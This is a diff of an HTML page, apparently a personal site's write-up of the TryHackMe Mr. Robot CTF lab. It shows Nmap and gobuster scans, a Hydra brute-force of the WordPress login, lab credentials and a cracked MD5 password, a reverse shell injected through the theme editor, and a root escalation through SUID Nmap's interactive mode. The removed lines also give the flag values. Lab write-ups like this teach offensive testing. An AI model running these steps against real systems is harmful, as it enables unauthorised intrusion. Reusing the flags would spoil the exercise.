@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mr Robot CTF Writeup | Mohd Faiz</title>
+    <title>Mr. Robot CTF Writeup | Mohd Faiz</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -37,131 +37,127 @@
         <a href="../index.html#labs" class="back-btn">&lt;-- Back to Labs</a>
         
         <div class="header">
-            <h1>TryHackMe: Mr Robot CTF Writeup</h1>
+            <h1>🤖 TryHackMe – Mr. Robot CTF</h1>
             <div class="meta">
-                <span>Target IP: <code>10.10.231.78</code></span>
+                <span>Machine Name: Mr. Robot CTF</span>
                 <span>Difficulty: Medium</span>
-                <span>Author: Mohd Faiz</span>
+                <span>Platform: TryHackMe</span>
+                <span>Type: Linux / Web</span>
             </div>
             <div>
                 <span class="tag">WordPress</span>
                 <span class="tag">Hydra</span>
-                <span class="tag">John The Ripper</span>
                 <span class="tag">SUID Nmap</span>
+                <span class="tag">Hash Cracking</span>
             </div>
         </div>
 
-        <!-- Task 1 -->
         <div class="task-box">
             <div class="task-header">
-                <span>Phase 1: Reconnaissance & Key 1</span>
-                <span style="color:#8b949e;">[Nmap & Robots.txt]</span>
+                <span>🔍 Enumeration</span>
+                <span style="color:#8b949e;">[Nmap & Web Enumeration]</span>
             </div>
             <div class="task-body">
-                <p>Start with a standard network enumeration scan using Nmap:</p>
-                <pre><code>nmap -sC -sV -oN mrrobot_nmap.txt 10.10.231.78</code></pre>
+                <h3>🔹 Nmap Scan</h3>
+                <pre><code>nmap -sV &lt;IP&gt;</code></pre>
 
-                <h3>Ports Discovered:</h3>
+                <h3>🔹 Nmap Findings</h3>
                 <ul>
-                    <li><code>80/tcp</code> - HTTP (Apache httpd)</li>
-                    <li><code>443/tcp</code> - HTTPS (Apache httpd)</li>
+                    <li><code>22/tcp</code> → SSH</li>
+                    <li><code>80/tcp</code> → HTTP</li>
+                    <li><code>443/tcp</code> → HTTPS</li>
                 </ul>
 
-                <h3>Inspecting Web Directory:</h3>
-                <p>Check the target's <code>robots.txt</code> file directly in the browser or via terminal:</p>
-                <pre><code>curl http://10.10.231.78/robots.txt</code></pre>
-
-                <p>Output:</p>
-                <pre><code>User-agent: *
-fsocity.dic
-key-1-of-3.txt</code></pre>
-
-                <p>Navigate to <code>http://10.10.231.78/key-1-of-3.txt</code> to recover Key 1. Also download the custom dictionary file <code>fsocity.dic</code>.</p>
-
-                <div class="flag-box">
-                    Key 1 Flag: 07173f76e81406d22329145f773710db
-                </div>
-            </div>
-        </div>
-
-        <!-- Task 2 -->
-        <div class="task-box">
-            <div class="task-header">
-                <span>Phase 2: WordPress Exploitation & Key 2</span>
-                <span style="color:#8b949e;">[Bruteforce & Reverse Shell]</span>
-            </div>
-            <div class="task-body">
-                <p>We discover a WordPress login portal running on <code>http://10.10.231.78/wp-login.php</code>.</p>
-
-                <h3>1. Wordlist Cleaning:</h3>
-                <p>The downloaded dictionary file <code>fsocity.dic</code> contains over 800,000 words with many duplicates. Sort and clean the list:</p>
-                <pre><code>sort -u fsocity.dic > cleaned_wordlist.txt</code></pre>
-
-                <h3>2. Username Enumeration:</h3>
-                <p>When entering a random username like <code>admin</code> on WordPress, the error message states <em>"Invalid username"</em>. However, testing <code>Elliot</code> gives <em>"The password you entered for the username Elliot is incorrect"</em>, confirming <code>Elliot</code> is a valid user!</p>
-
-                <h3>3. Password Brute-forcing:</h3>
-                <p>Use Hydra to crack Elliot's password using the cleaned wordlist:</p>
-                <pre><code>hydra -l Elliot -P cleaned_wordlist.txt 10.10.231.78 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"</code></pre>
-                <p>Credentials found: <code>Elliot : ER28-0652</code></p>
-
-                <h3>4. Web Shell & Reverse Shell:</h3>
+                <h3>🌐 Web Enumeration</h3>
+                <p>Checking <code>robots.txt</code> file:</p>
+                <pre><code>http://&lt;IP&gt;/robots.txt</code></pre>
+                
+                <p>Discovered files:</p>
                 <ul>
-                    <li>Log into WordPress Admin dashboard.</li>
-                    <li>Navigate to <strong>Appearance -> Editor</strong>.</li>
-                    <li>Select the <code>404.php</code> template file and replace its contents with a PHP Reverse Shell.</li>
-                    <li>Start your Netcat listener: <code>nc -lvnp 4444</code>.</li>
-                    <li>Trigger the shell by visiting: <code>http://10.10.231.78/wp-content/themes/twentyfifteen/404.php</code>.</li>
+                    <li><code>key-1-of-3.txt</code> ✅</li>
+                    <li><code>fsocity.dic</code> (dictionary wordlist)</li>
                 </ul>
 
-                <h3>5. Internal Escalation to user robot:</h3>
-                <p>In <code>/home/robot</code>, we find two files: <code>key-2-of-3.txt</code> and <code>password.raw-md5</code>.</p>
-                <pre><code>cat /home/robot/password.raw-md5
-robot:c3fcd3d76192e4007dfb496cca67e13b</code></pre>
-
-                <p>Crack the MD5 hash using John the Ripper or CrackStation:</p>
-                <p>MD5 <code>c3fcd3d76192e4007dfb496cca67e13b</code> -> <code>abcdefghijklmnopqrstuvwxyz</code></p>
-
-                <p>Switch user on the target terminal:</p>
-                <pre><code>su robot
-Password: abcdefghijklmnopqrstuvwxyz
-cat /home/robot/key-2-of-3.txt</code></pre>
-
                 <div class="flag-box">
-                    Key 2 Flag: 822c73956184f694993bede3e40e200a
+                    Flag 1 Found: key-1-of-3.txt ✅
                 </div>
+
+                <h3>🔹 Directory Bruteforce</h3>
+                <pre><code>gobuster dir -u http://&lt;IP&gt; -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                <p>Findings: <code>/wp-login.php</code></p>
             </div>
         </div>
 
-        <!-- Task 3 -->
         <div class="task-box">
             <div class="task-header">
-                <span>Phase 3: Root Escalation & Key 3</span>
-                <span style="color:#8b949e;">[Nmap Interactive SUID]</span>
+                <span>🔐 Credential Discovery & Initial Access</span>
+                <span style="color:#8b949e;">[Brute Force & Theme Injection]</span>
             </div>
             <div class="task-body">
-                <p>Search for elevated binaries with SUID permission bits set:</p>
-                <pre><code>find / -user root -perm -4000 2>/dev/null</code></pre>
+                <h3>🔹 User Enumeration (Hydra)</h3>
+                <p>Discovered valid username: <code>elliot</code></p>
 
-                <h3>Unusual SUID Binary Found:</h3>
-                <pre><code>/usr/local/bin/nmap</code></pre>
+                <h3>🔹 Password Bruteforce</h3>
+                <pre><code>hydra -l elliot -P fsocity.dic &lt;IP&gt; http-post-form</code></pre>
 
-                <p>Check Nmap version running on target:</p>
-                <pre><code>/usr/local/bin/nmap --version</code></pre>
-                <p>Nmap v2.02 is installed. Older versions of Nmap (2.02 to 5.21) feature an <strong>interactive mode</strong> that allows executing shell commands as the file owner (root)!</p>
+                <h3>🔹 Credentials Found</h3>
+                <ul>
+                    <li>Username: <code>elliot</code></li>
+                    <li>Password: <code>ER28-0652</code></li>
+                </ul>
 
-                <h3>Exploitation:</h3>
+                <h3>💣 Initial Access (WordPress Exploitation)</h3>
+                <ul>
+                    <li>Logged into WordPress dashboard.</li>
+                    <li>Identified Theme Editor vulnerability.</li>
+                    <li>Injected reverse shell payload.</li>
+                </ul>
+
+                <h3>🐚 Shell Access</h3>
+                <p>Gained initial shell access as a low-privileged user.</p>
+            </div>
+        </div>
+
+        <div class="task-box">
+            <div class="task-header">
+                <span>🔎 Post Exploitation & Escalation</span>
+                <span style="color:#8b949e;">[SSH Access & SUID Nmap]</span>
+            </div>
+            <div class="task-body">
+                <h3>🔹 Sensitive Data Discovery</h3>
+                <p>Found hash string for robot user: <code>robot : &lt;password hash&gt;</code></p>
+                <p>Cracked the password hash to obtain cleartext credentials for <code>robot</code>.</p>
+
+                <h3>🔐 SSH Access</h3>
+                <pre><code>ssh robot@&lt;IP&gt;</code></pre>
+
+                <div class="flag-box">
+                    Flag 2 Found: key-2-of-3.txt ✅
+                </div>
+
+                <h3>🔐 Privilege Escalation</h3>
+                <p>SUID Enumeration:</p>
+                <pre><code>find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+                <p>Interesting Binary Found: <code>/usr/local/bin/nmap</code></p>
+
+                <h3>🔹 Exploitation (Nmap Interactive Mode)</h3>
                 <pre><code>/usr/local/bin/nmap --interactive
-nmap> !sh
-whoami
-root</code></pre>
-
-                <p>Retrieve final flag:</p>
-                <pre><code>cat /root/key-3-of-3.txt</code></pre>
+!sh</code></pre>
 
                 <div class="flag-box">
-                    Key 3 Flag: 04a54d72c0a5fa6fe0e7023d21a28186
+                    💥 Root Shell Obtained!<br>
+                    Final Flag Location: /root/key-3-of-3.txt ✅
                 </div>
+
+                <h3>🏁 Conclusion</h3>
+                <ul>
+                    <li>Enumerated services and web directories</li>
+                    <li>Discovered credentials via brute force</li>
+                    <li>Exploited WordPress vulnerability</li>
+                    <li>Gained shell access</li>
+                    <li>Performed privilege escalation using SUID misconfiguration</li>
+                    <li>Achieved root access ✅</li>
+                </ul>
             </div>
         </div>
 
